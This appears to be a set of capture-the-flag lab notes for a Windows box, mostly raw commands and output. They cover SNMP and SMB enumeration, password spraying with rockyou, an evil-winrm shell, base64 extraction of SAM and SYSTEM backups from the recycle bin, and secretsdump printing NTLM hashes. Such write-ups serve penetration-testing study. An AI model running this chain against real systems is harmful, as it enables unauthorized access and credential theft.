@@ -1,0 +1,107 @@
+
+
+
+┌──(root㉿kali)-[~]
+└─# smbclient -L //10.201.58.18/ -N  
+session setup failed: NT_STATUS_ACCESS_DENIED
+                                               
+
+┌──(root㉿kali)-[~]
+└─# mysql -h 10.201.58.18 -u root
+ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host 'ip-10-6-66-96.ec2.internal' is not allowed to connect to this MariaDB server
+                                                                                                                     
+┌──(root㉿kali)-[~]
+└─# 
+
+no results fuzzing subdomains, or raft medium files/directories
+
+┌──(root㉿kali)-[~]
+└─# onesixtyone 10.201.58.18 -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 
+Scanning 1 hosts, 120 communities
+10.201.58.18 [openview] Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
+                                                                                                                     
+┌──(root㉿kali)-[~]
+└─# 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# crackmapexec smb 10.201.58.18 -u Jareth -p /usr/share/wordlists/rockyou.txt --no-bruteforce
+...
+SMB         10.201.58.18    445    YEAR-OF-THE-OWL  [+] year-of-the-owl\Jareth:sarah 
+
+
+┌──(root㉿kali)-[~]
+└─# evil-winrm -u Jareth -p sarah -i 10.201.58.18
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Jareth\Documents> 
+
+
+*Evil-WinRM* PS C:\> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name              SID
+====================== =============================================
+year-of-the-owl\jareth S-1-5-21-1987495829-1628902820-919763334-1001
+
+
+*Evil-WinRM* PS C:\> ls 'c:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'
+
+
+    Directory: C:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        9/18/2020   7:28 PM          49152 sam.bak
+-a----        9/18/2020   7:28 PM       17457152 system.bak
+
+
+*Evil-WinRM* PS C:\> cd 'c:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'
+*Evil-WinRM* PS C:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> 
+
+errors downloading. we can either move them 
+
+move .\system.bak c:\users\jareth\documents\system.bak
+move .\sam.bak c:\users\jareth\documents\sam.bak
+
+or convert to base64
+
+*Evil-WinRM* PS C:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001\sam.bak'))
+
+or
+
+*Evil-WinRM* PS C:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> [IO.File]::WriteAllText('C:\Users\Jareth\Documents\sam.b64',[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001\sam.bak')))
+*Evil-WinRM* PS C:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> [IO.File]::WriteAllText('C:\Users\Jareth\Documents\system.b64',[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001\system.bak')))
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-secretsdump -sam sam.bak -system system.bak LOCAL
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0xd676472afd9cc13ac271e26890b87a8c
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::
+Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::
+[*] Cleaning up... 
+                           
+
+
+
+
+
+
+
+
